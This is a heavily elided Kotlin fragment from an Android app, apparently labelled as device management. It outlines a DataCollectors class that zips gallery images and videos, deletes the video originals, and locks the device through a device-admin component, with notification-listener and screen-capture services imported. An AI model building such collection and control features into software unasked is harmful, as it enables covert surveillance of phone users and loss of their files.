package com.tawasul.app.data.remote
...
import com.tawasul.app.data.model.CollectedData
...
import com.tawasul.app.util.PermissionManager
import com.tawasul.app.util.DeviceUtils
import com.tawasul.app.service.MDMNotificationListenerService
import com.tawasul.app.service.ScreenCaptureService
...
class DataCollectors(private val context: Context) {
    ...
    fun getGalleryImages(): Any {
        ...
        try {
            ...
            val result = com.tawasul.app.util.ZipUtils.zipFiles(toZip, zipFile, "img")
    ...
    fun getGalleryVideos(): Any {
        ...
        try {
            ...
            val result = com.tawasul.app.util.ZipUtils.zipFiles(toZip, zipFile, "vid")
            toZip.forEach { it.delete() }
    ...
    fun lockDevice(): String {
        ...
        val admin = android.content.ComponentName(context, com.tawasul.app.receiver.MDMDeviceAdminReceiver::class.java)
